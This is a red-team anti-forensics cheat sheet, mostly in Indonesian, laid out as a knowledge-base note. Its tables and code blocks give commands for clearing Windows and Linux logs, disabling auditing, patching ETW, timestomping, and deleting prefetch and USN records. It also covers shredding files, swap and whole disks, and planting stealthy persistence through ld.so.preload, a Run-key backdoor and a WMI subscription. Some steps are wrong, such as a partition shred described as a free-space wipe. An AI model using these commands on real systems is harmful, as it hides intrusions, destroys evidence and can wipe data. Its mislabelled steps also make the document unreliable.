---
title: Attack Perspective — Data Forensics (Red Team Anti-Forensics)
tags:
- attack
- red-team
- data-forensics
- anti-forensics
- wipe
- timestomp
- artifact
created: 2026-08-14
updated: 2026-08-14
status: complete
cssclasses:
  - wide-table
  
---

# Data Forensics — Perspektif Penyerang (Anti-Forensics)

> Forensics (defender) = recovery dari disk/memory/network. Red team anti-forensics = pastikan TIDAK ada yang bisa di-recover. Layer: file deletion → slack wipe → timestamp → log → memory → MFT.

## 1. Anti-Forensics Layer

| Layer | Defender Tool | Red Team Bypass | Tool / Teknik | Detection |
|-------|--------------|-----------------|---------------|-----------|
| **File Deletion** | Recuva, TestDisk, PhotoRec | Secure overwrite | sdelete, shred, dd zero | Recovery = zero content |
| **Free Space** | File slack extraction | Overwrite slack | cipher /w (Windows), slacker | Slack = zero |
| **Disk Format** | TestDisk partition recovery | Full zero-fill | dd if=/dev/zero, DBAN | No partition table |
| **SSD** | TRIM = block erase | ATA secure erase | hdparm --secure-erase | Hardware erase |
| **Timestamp** | Timeline (MACB) | Timestomp | timestomp, Set-MAC | Timeline broken |
| **Event Log** | Event log analysis | Clear/disable | wevtutil cl, auditctl -e 0 | Log gap |
| **Prefetch** | Execution history | Delete prefetch | Remove-Item *.pf | No execution evidence |
| **MFT/USN** | File history | Delete USN journal | fsutil usn deletejournal | No file history |
| **Memory** | Volatility dump | In-memory only | No swap, no pagefile | No RAM artifact |
| **Registry** | RecentDocs, UserAssist | Delete keys | reg delete | No usage history |

## 2. Post-Operation Cleanup Chain

```
Operation done / detect risk
    ↓
1. Memory: Kill C2 process → memory freed
  ├── Process exit → RAM freed
  └── No swap/pagefile use (in-memory only)
    ↓
2. Disk: Secure delete payload, tools, temp
  ├── sdelete -p 7 target.exe (Windows)
  ├── shred -u target (Linux)
  └── cipher /w C: (wipe free space)
    ↓
3. Timestamp: Reset to normal
  ├── timestomp file -m "01/01/2025 09:00:00" (Metasploit)
  └── PowerShell Set-ItemProperty -Path file -Name LastWriteTime
    ↓
4. Logs:
  ├── wevtutil cl Security/System/Application (Windows)
  ├── journalctl --vacuum-time=1d (Linux)
  ├── auditctl -e 0 (Linux)
  └── ETW patch (EtwEventWrite → ret)
    ↓
5. Execution Artifact:
  ├── Delete C:\Windows\Prefetch\*.pf
  ├── fsutil usn deletejournal /d C:
  └── reg delete RecentDocs
    ↓
6. Network: Close C2 → clear ARP/DNS cache
    ↓
7. Final: Wipe staging dir → 7-pass → exit
```

## 3. Forensic Recovery vs Anti-Forensics Gap

| Forensics Tool | Target | Anti-Forensics Bypass | Result |
|----------------|--------|----------------------|--------|
| Volatility | Memory process/cred | In-memory only + exit | No artifact |
| Plaso (timeline) | MFT/log/prefetch | Timestomp + clear + delete | Timeline broken |
| Autopsy | Disk image history | Full zero-fill + USN delete | No history |
| KAPE | Windows artifact | Delete artifact | Empty output |
| Magnet AXIOM | Cloud/mobile artifact | Cloud audit off + factory reset | No artifact |
| TestDisk | Deleted partition | dd zero-fill | No partition |

## 4. Tool Stack

| Tool | Platform | Use |
|------|----------|-----|
| **sdelete** | Windows | Secure delete (1-7 pass) |
| **shred** | Linux | Secure delete (overwrite + unlink) |
| **dd** | Linux | Full disk zero-fill |
| **DBAN** | Bootable | Full disk wipe |
| **timestomp** | Windows | MACE timestamp modify |
| **wevtutil** | Windows | Event log clear |
| **cipher /w** | Windows | Free space wipe |
| **auditctl** | Linux | Audit disable |
| **fsutil** | Windows | USN journal delete |

## 5. Referensi
- sdelete — https://learn.microsoft.com/en-us/sysinternals/downloads/sdelete
- Volatility 3 — https://github.com/volatilityfoundation/volatility3
- Anti-Forensics — https://www.sciencedirect.com/topics/computer-science/anti-forensics
- The Sleuth Kit — https://www.sleuthkit.org/

## Konkret — Anti-Forensics (Testable)

### File Wipe & Overwrite

```bash
# 1. Overwrite file dengan random data (7 pass = DOD 5220.22-M)
shred -vfz -n 7 /path/file
# -v verbose, -f force, -z zero last pass

# 2. Free space wipe
shred -n 7 /dev/sda1   # CAUTION: wipe semua free space

# 3. Hapus metadata + timeline (timestomp)
# Linux: touch -d "2020-01-01 00:00:00" file
# Windows (timestomp.exe):
timestomp.exe file -m "01/01/2020 00:00:00" -a "01/01/2020" -c "01/01/2020"

# 4. Log cleaning
echo "" > /var/log/auth.log        # kosongkan tapi file ada
rm -f /var/log/auth.log            # hapus total (mencurigakan)
```

### Memory Anti-Forensics

```bash
# Hapus dari /proc/meminfo / /proc/kcore visible
# Overwrite buffer di RAM sebelum shutdown
# Defense: anti-forensics tool (e.g. MEMORY ZERO)

# Swap wipe
swapoff /dev/sda2 && dd if=/dev/zero of=/dev/sda2 bs=1M
```

### Hidden Persistence

```bash
# 1. Linux: /etc/ld.so.preload (lib hook)
echo "/tmp/libevil.so" > /etc/ld.so.preload

# 2. Windows: Registry Run key
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\path\evil.exe"

# 3. WMI Event Subscription (persistence + stealth)
wmic /namespace:\\root\subscription create __EventFilter name=Evil, EventNamespace='root\cimv2', QueryLanguage='WQL', Query='SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA \"Win32_Process\" AND TargetInstance.Name=\"cmd.exe\"'

# 4. Bootkit / UEFI (deepest persistence)
# firmware rootkit → survive reinstall
```
---

audited
---
